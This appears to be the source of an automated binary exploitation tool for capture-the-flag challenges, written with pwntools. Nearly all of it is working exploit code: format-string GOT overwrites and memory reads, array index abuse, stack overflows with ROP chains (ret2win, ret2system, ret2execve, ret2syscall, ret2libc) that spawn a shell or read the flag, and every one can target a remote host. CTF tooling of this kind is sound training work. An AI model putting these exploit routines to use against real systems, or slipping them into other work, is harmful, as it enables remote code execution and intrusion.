from pwn import *
import json

from static import Static
from app import App
from rop import ROP
from dynamic import Dynamic

context.log_level = "error"

class Exploits(App):
    def __init__(self, binary):
        super().__init__(binary)

    def got_overwrite(self, binary, function, _remote=None):
        # you have to tell pwntools how to do their bulllllllsheeeettttyytytyytyt
        context.update(
                arch="amd64",
                endian="little"
                )

        s = Static()
        d = Dynamic()

        calls = s.get_calls(function)

        got_call = calls[-1]["disasm"]
        got_call = got_call[got_call.index("call sym.imp.") + len("call sym.imp."):]

        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)
        binsh = None

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        offset = d.find_printf_offset(binary)

        # all test binaries want pwnme to be 1337 (0x539), lets hope that doesn't change for the real binaries
        # TODO: ask marcus this
        payload = fmtstr_payload(offset, {self.pwnelf.got[got_call]: self.pwnelf.sym["win"]}, write_size="int") 
        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")
        
        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None


    def printf_write_var(self, binary, _remote=None):
        # you have to tell pwntools how to do their bulllllllsheeeettttyytytyytyt
        context.update(
                arch="amd64",
                endian="little"
                )

        d = Dynamic()
        
        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)
        binsh = None

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        offset = d.find_printf_offset(binary)

        # all test binaries want pwnme to be 1337 (0x539), lets hope that doesn't change for the real binaries
        # TODO: ask marcus this
        payload = fmtstr_payload(offset, {self.pwnelf.sym.pwnme: 0x539}, write_size="int") 
        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")
        
        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None

        
    
    def printf_read_var(self, binary, _remote=None):
        flag = b""

        for i in range(200):
            if _remote:
                io = remote(_remote[0], _remote[1])
            else:
                io = process(binary)

            io.sendlineafter(b">>>", f"%{i+1}$p".encode())

            out = io.recvall(0.5)

            try:
                out = out[out.index(b"0x"):]
                out = out[:out.index(b"\n")]

                out = int(out, 16).to_bytes(8, "little")

                if b"flag{" in out:
                    flag = out

                elif b"flag{" in flag:
                    if b"}" in out:
                        flag += out[:out.index(b"}") + 1]
                        break

                    flag += out

            except:
                pass

            io.close()

        return flag

    def arrayabuse(self, binary, _remote=None):
        binsh = None
        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        for i in range(100):
            io = process(binary)

            io.sendlineafter(b">>>", f"-{i + 1}".encode())

            payload = p64(self.pwnelf.sym["win"]) * 4
            io.sendlineafter(b">>>", payload)

            if binsh:
                io.sendline(b"cat flag.txt")
                io.sendline(b"exit")
            
            flag = io.recvall(0.5)

            io.close()
            
            if b"flag{" in flag:
                if _remote:
                    io = remote(_remote[0], _remote[1])
                    io.sendlineafter(b">>>", f"-{i + 1}".encode())

                    io.sendlineafter(b">>>", payload)

                    if binsh:
                        io.sendline(b"cat flag.txt")
                        io.sendline(b"exit")
                    
                    flag = io.recvall(0.5)

                    io.close()

                return flag[flag.index(b"flag"):flag.index(b"}") + 1]      

        return None

    def write_gadgets(self, binary, add_ret=False, _remote=None):
        r = ROP()
        d = Dynamic()
        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        payload = d.find_overflow(binary)
        payload += r.arbitrary_write(self, self.pwnelf.bss(), b"/bin/sh\x00", True)

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnelf.plt["system"])
        
        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        io.sendlineafter(b">>>", payload)

        io.recvuntil(b"<<<")

        io.sendline(b"cat flag.txt")
        io.sendline(b"exit")

        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None
        
    def ret2syscall(self, binary, syscall, excempt=0, use_angr=False, _remote=None):
        r = ROP()
        d = Dynamic()
        
        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        binsh = next(self.pwnelf.search(b"/bin/sh"))
        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)

        # in case ret2syscall fails, call it with a different excempt value
        # each value will try to infer that some register that should be null is already null
        if excempt == 0:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
        elif excempt == 1:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0})
        elif excempt == 2:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rdx": 0})
        elif excempt == 3:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh})
        else:
            print("[!] out of excemptions.")
            return None

        payload += p64(syscall)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendlineafter(b"<<<", b"cat flag.txt")

            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2syscall did not work.")
            return None


    def ret2system(self, binary, add_ret=True, use_angr=False, _remote=None):
        r = ROP()
        d = Dynamic()

        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        cat_flag = next(self.pwnelf.search(b"/bin/cat flag.txt"))
        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)


        payload += r.generate_rop_chain(self, {"rdi": cat_flag})

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnelf.plt["system"])

        io.sendlineafter(b">>>", payload)

        try:
            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2system did not work.")
            return None


    def ret2execve(self, binary, use_angr=False, _remote=None):
        r = ROP()
        d = Dynamic()

        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            io.close()

            print("[!] /bin/sh not found in ret2execve!")
            return None

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)

        payload += r.generate_rop_chain(self, {"rdi":binsh, "rsi":0, "rdx":0})

        payload += p64(self.pwnelf.plt["execve"])

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            flag = io.recvuntil(b"}")

            io.close()

            return flag[flag.index(b"flag"):]

        except:
            io.close()

            print("[!] ret2execve failed.")
            return None


    # in my test bins, one_gadget does not want to work
    # ret2libc works though
    def ret2one(self, binary, leaked_function, add_ret=True, use_angr=False, _remote=None):
        d = Dynamic()
        r = ROP()
        
        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        io.recvuntil(b"<<< Leak: ")
        leak = io.recvline()
        leak = int(leak[:-1], 16)

        libcoff = leak - self.pwnlibc.sym[leaked_function]

        print(f"[*] Libc offset: {hex(libcoff)}")

        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["vuln"])
        else:
            payload = d.find_overflow(binary)

        payload += r.generate_rop_chain(self, { "rdi": next(self.pwnlibc.search(b"/bin/sh")) + libcoff })

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnlibc.sym["system"] + libcoff)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2one failed.")
            return None


    def rop_parameters(self, binary, function, add_ret=False, use_angr=False, _remote=None):
        d = Dynamic()
        s = Static()
        r = ROP()

        binsh = None
        ret = None
        
        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))
        except:
            pass
        
        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        if not use_angr:
            payload = d.find_overflow(binary)
        else:
            payload = d.find_overflow_angr(binary)

        constrained_win = self.pwnelf.sym["constrained_win"]

        print('constrained win:', constrained_win)

        # find out if other registers exist in instructions and clear them if needed with 8 extra bytes 
        pop_rdi = None
        pop_rsi = None
        pop_rdx = None
        other_reg= None
        rdi_param = 0
        rsi_param = 0
        rdx_param = 0

        cmps = s.cmp_params(function)
        num_regs = len(list(cmps.keys()))

        param_regs = [] 
        addrs_hex = sorted(list(cmps.keys()), key=lambda x: int(x, 16))
        
        if len(addrs_hex) >= 1:
            rdi_param = cmps[addrs_hex[0]]
        if len(addrs_hex) >= 2:
            rsi_param = cmps[addrs_hex[1]]
        if len(addrs_hex) == 3:
            rdx_param = cmps[addrs_hex[2]]

        print(f"rdi: {rdi_param}")
        print(f"rsi: {rsi_param}")
        print(f"rdx: {rdx_param}")


        if rdx_param > 0:
            payload += r.generate_rop_chain(self, { "rdi": rdi_param, "rsi": rsi_param, "rdx": rdx_param })

        elif rsi_param > 0:
            payload += r.generate_rop_chain(self, { "rdi": rdi_param, "rsi": rsi_param })

        else:
            payload += r.generate_rop_chain(self, {"rdi": rdi_param })

        if ret and add_ret:
            payload += p64(ret)

        payload += p64(constrained_win)
        
        #print(payload)

        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")

        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None  

    def ret2win(self, binary, add_ret=False, use_angr=False, _remote=None):
        d = Dynamic()

        binsh = None
        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass
        
        ret = None
        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        if _remote:
            io = remote(_remote[0], _remote[1])
        else:
            io = process(binary)

        if not use_angr:
            payload = d.find_overflow(binary)

        else:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["vuln"])

        if not payload:
            print("[!] Trying angr.")
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["vuln"])

        win = self.pwnelf.sym["win"] + 1

        if add_ret and ret is not None:
            payload += p64(ret)

        payload += p64(win)
        io.sendline(payload)

        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")

        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None
